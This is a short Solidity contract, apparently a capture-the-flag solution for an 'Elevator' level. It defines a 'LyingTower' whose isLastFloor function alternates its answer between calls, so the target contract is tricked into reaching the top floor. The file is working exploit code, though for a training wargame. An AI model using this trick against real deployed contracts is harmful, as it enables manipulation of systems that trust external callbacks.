pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) public view returns (bool);
}

contract LyingTower is Building {
  Elevator _elevator;
  bool lastFloor = true;

  function LyingTower(address elevator) public payable {
    _elevator = Elevator(elevator);
  }

  function isLastFloor(uint) public view returns (bool) {
    lastFloor = !lastFloor;
    return lastFloor;
  }

  function goToTop() public {
    _elevator.goTo(1);
  }
}